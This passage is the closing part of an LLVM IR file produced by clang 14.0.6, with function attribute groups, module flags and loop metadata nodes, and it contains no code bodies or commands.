attributes #6 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { argmemonly nofree nounwind willreturn }
attributes #8 = { nounwind }
attributes #9 = { nounwind readnone willreturn }
attributes #10 = { noreturn nounwind }
attributes #11 = { nounwind readonly willreturn }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
